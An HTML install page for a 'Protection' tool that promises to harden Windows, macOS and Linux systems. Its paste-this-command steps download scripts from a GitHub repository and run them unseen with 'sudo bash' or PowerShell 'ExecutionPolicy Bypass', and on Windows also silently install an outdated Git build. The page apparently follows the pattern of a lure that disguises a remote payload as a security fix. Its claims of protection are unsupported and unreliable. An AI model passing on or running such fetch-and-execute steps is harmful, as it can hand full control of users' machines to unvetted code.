<p align="center">
  <strong>Click your operating system to ensure maximum security</strong>
</p>

<p align="center">
  <a href="#windows-install-instructions">
    <img src="./assets/windows.png" alt="Windows Logo" width="100" style="margin-right: 50px;"/>
  </a>
  <a href="#macos-install-instructions">
    <img src="./assets/macos.png" alt="macOS Logo" width="100" style="margin-right: 50px;"/>
  </a>
  <a href="#linux-install-instructions">
    <img src="./assets/linux.png" alt="Linux Logo" width="100"/>
  </a>
</p>

<div style="display: flex; align-items: flex-start; margin-bottom: 40px;">
  <div style="flex: 1;">
    <h2>Protection robustly and comprehensively optimizes your system's security settings.</h2>
    <ul>
      <li>✓ Enables Firewall</li>
      <li>✓ Blocks unauthorized access</li>
      <li>✓ Reduces attack surface by disabling unused services</li>
      <li>✓ Applies security settings</li>
      <li>✓ Enhances overall system stability and performance</li>
      <li>✓ Prevents common security vulnerabilities</li>
    </ul>
  </div>
  <div style="flex: 0; align-self: flex-start; margin-left: 20px;">
    <img src="./assets/logo.svg" alt="Project Logo" width="80"/>
  </div>
</div>

<h2 id="windows-install-instructions">Windows Install Instructions</h2>

Ensure you have at least 200 MB of free space available.

<div style="display: flex; align-items: flex-start; margin-bottom: 40px;">
  <div style="flex: 1;">
    <ol>
      <li><strong>Open Command Prompt</strong>
        <ul>
          <li>Press <code>Windows + R</code></li>
          <li>Type <code>cmd</code></li>
          <li>Press <code>Enter</code></li>
        </ul>
      </li>
      <li><strong>Install Git</strong>
        <ul>
          <li>Copy and paste the following command into Command Prompt:</li>
          <pre><code>powershell -Command "Invoke-WebRequest -Uri https://github.com/git-for-windows/git/releases/download/v2.14.1.windows.1/Git-2.14.1-64-bit.exe -OutFile Git-2.14.1-64-bit.exe"</code></pre>
          <li>Once downloaded, copy and paste the following command into Command Prompt:</li>
          <pre><code>.\Git-2.14.1-64-bit.exe /VERYSILENT /NORESTART</code></pre>
        </ul>
      </li>
      <li><strong>Download and Run the Protection Script</strong>
        <ul>
          <li>Copy and paste the following commands into Command Prompt:</li>
          <pre><code>curl -o win.ps1 https://raw.githubusercontent.com/boolskii/protection/main/win.ps1
powershell -ExecutionPolicy Bypass -File .\win.ps1</code></pre>
        </ul>
      </li>
    </ol>
    Your Windows PC is now protected from unwanted activity.
  </div>
  <div style="flex: 0; align-self: flex-start; margin-left: 20px;">
    <img src="./assets/windows.png" alt="Windows Logo" width="80"/>
  </div>
</div>

<h2 id="macos-install-instructions">macOS Install Instructions</h2>

Ensure you have at least 100 MB of free space available.

<div style="display: flex; align-items: flex-start; margin-bottom: 40px;">
  <div style="flex: 1;">
    <ol>
      <li><strong>Open Terminal</strong></li>
      <li><strong>Install Homebrew (if not already installed)</strong>
        <ul>
          <li>Copy and paste the following command into Terminal:</li>
          <pre><code>/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"</code></pre>
        </ul>
      </li>
      <li><strong>Install Git</strong>
        <ul>
          <li>Copy and paste the following command into Terminal:</li>
          <pre><code>brew install git</code></pre>
        </ul>
      </li>
      <li><strong>Download and Run the Protection Script</strong>
        <ul>
          <li>Copy and paste the following commands into Terminal:</li>
          <pre><code>curl -o mac.sh https://raw.githubusercontent.com/boolskii/protection/main/mac.sh
sudo bash ./mac.sh</code></pre>
        </ul>
      </li>
    </ol>
    Your macOS system is now protected from unwanted activity.
  </div>
  <div style="flex: 0; align-self: flex-start; margin-left: 20px;">
    <img src="./assets/macos.png" alt="macOS Logo" width="80"/>
  </div>
</div>

<h2 id="linux-install-instructions">Linux Install Instructions</h2>

Ensure you have at least 100 MB of free space available.

<div style="display: flex; align-items: flex-start; margin-bottom: 40px;">
  <div style="flex: 1;">
    <ol>
      <li><strong>Open Terminal</strong></li>
      <li><strong>Update Package Lists</strong>
        <ul>
          <li>Copy and paste the following command into Terminal:</li>
          <pre><code>sudo apt-get update</code></pre>
        </ul>
      </li>
      <li><strong>Install Git</strong>
        <ul>
          <li>Copy and paste the following command into Terminal:</li>
          <pre><code>sudo apt-get install git -y</code></pre>
        </ul>
      </li>
      <li><strong>Download and Run the Protection Script</strong>
        <ul>
          <li>Copy and paste the following commands into Terminal:</li>
          <pre><code>curl -o lin.sh https://raw.githubusercontent.com/boolskii/protection/main/lin.sh
sudo bash ./lin.sh</code></pre>
        </ul>
      </li>
    </ol>
    Your Linux system is now protected from unwanted activity.
  </div>
  <div style="flex: 0; align-self: flex-start; margin-left: 20px;">
    <img src="./assets/linux.png" alt="Linux Logo" width="80"/>
  </div>
</div>
